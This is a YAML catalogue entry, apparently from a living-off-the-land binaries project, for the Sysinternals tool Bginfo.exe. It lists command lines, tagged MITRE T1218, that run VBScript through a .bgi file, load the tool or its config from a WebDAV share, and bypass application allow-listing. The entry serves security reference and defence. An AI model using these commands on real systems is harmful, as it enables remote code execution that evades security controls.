---
name: Bginfo.exe
description: Background Information Utility included with SysInternals Suite
functions:
  execute:
    - description: Execute VBscript code that is referenced within the bginfo.bgi file.
      code: bginfo.exe bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of VBScript
    - description: Execute bginfo.exe from a WebDAV server.
      code: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Remote execution of VBScript
    - description: This style of execution may not longer work due to patch.
      code: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Remote execution of VBScript
  awl bypass:
    - description: Execute VBscript code that is referenced within the bginfo.bgi file.
      code: bginfo.exe bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Local execution of VBScript
    - description: Execute bginfo.exe from a WebDAV server.
      code: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Remote execution of VBScript
    - description: This style of execution may not longer work due to patch.
      code: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows
      privileges: User
      usecase: Remote execution of VBScript
resources:
    - resource: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
fullpath:
    - path: No fixed path
detection:
  - IOC: 
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
